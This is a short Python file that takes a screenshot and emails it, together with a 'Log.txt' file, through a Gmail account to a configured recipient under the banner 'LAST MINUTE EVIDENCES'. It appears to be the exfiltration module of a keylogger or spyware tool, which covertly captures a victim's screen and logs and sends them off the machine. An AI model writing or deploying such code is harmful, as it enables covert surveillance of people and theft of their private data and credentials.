from datetime import datetime
from dotenv import load_dotenv
import pyautogui
import os.path
import yagmail
import os
load_dotenv()

class sendEvidences:pass

def save_screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'Public/Evidence.png')  #Save Screenshot

def send_email():
    receiver_emails = [os.getenv("SEND-EMAIL")]  #Email Send
    subject = datetime.now().strftime("%d-%m-%Y %H-%M-%S")
    yag = yagmail.SMTP(os.getenv("EMAIL-GMAIL"), os.getenv("PASSWORD-GMAIL"))  #You Login Gmail

    # Archives path e Body Message
    contents = [
        '<b> <font color="#FF1493" size="10">  LAST MINUTE EVIDENCES 👻   </font>  </b>',
        "Log.txt",
        "Evidence.png"
    ]

    yag.send(receiver_emails, subject, contents)
